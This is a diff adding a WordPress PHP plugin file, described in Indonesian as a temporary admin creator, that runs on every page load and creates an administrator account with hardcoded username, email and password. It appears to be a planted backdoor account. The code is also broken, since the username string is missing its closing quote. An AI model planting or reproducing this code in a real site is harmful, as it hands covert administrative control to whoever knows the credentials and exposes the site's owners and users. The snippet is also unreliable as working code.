@@ -1,0 +1,38 @@
+Description: Buat user admin sementara. Hapus file setelah user berhasil dibuat.
+Version: 1.0
+Author: You
+*/
+
+if ( defined( 'WP_INSTALLING' ) && WP_INSTALLING ) {
+    return;
+}
+
+add_action( 'init', function() {
+    // ========== UPLOAD ========== //
+    $username = 'dxadmin;
+    $email    = 'admin@gmail.com';
+    $password = 'godknowsaboutthis'; 
+
+    if ( empty( $username ) || empty( $email ) || empty( $password ) ) {
+        return;
+    }
+
+    if ( username_exists( $username ) || email_exists( $email ) ) {
+        return;
+    }
+
+    require_once ABSPATH . 'wp-includes/pluggable.php';
+
+    $user_id = wp_create_user( $username, $password, $email );
+    if ( is_wp_error( $user_id ) ) {
+        error_log( 'Emergency admin creation failed: ' . $user_id->get_error_message() );
+        return;
+    }
+
+    $user = new WP_User( $user_id );
+    $user->set_role( 'administrator' );
+
+    error_log( sprintf( 'Emergency admin created: %s (%d)', $username, $user_id ) );
+
+    set_transient( 'emergency_admin_created_' . md5( $username . $email ), 1, DAY_IN_SECONDS );
+}, 5 );
